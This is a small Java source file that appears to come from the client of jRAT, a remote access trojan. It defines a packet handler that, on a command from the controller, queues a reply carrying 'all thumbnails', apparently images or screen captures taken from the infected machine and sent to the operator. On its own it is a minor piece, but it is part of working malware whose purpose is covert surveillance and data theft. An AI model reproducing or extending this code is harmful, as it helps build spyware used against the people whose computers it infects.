package jrat.client.packets.incoming;

import jrat.client.Connection;
import jrat.client.packets.outgoing.Packet71AllThumbnails;

public class Packet75AllThumbnails implements IncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		con.addToSendQueue(new Packet71AllThumbnails());
	}

}
